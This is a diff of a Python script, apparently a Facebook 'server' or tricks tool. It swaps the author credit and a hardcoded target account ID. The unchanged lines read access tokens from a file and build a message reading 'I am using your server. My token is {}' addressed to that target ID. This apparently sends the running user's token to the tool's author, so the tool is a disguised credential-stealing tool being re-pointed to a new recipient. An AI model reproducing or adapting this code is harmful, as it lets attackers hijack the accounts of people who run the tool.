@@ -39,15 +39,15 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello Deepak Rajput ! I am using your server. My token is {}"
+      msg_template = "Hello Raaz Sir ! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100013139415727"
+      target_id = "100011946885151"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•──────────────────────TRICKS BY CHACHU ──────────────────────────────•')
+          print('\033[1;92m' + '•──────────────────────TRICKS BY RAAZ ──────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
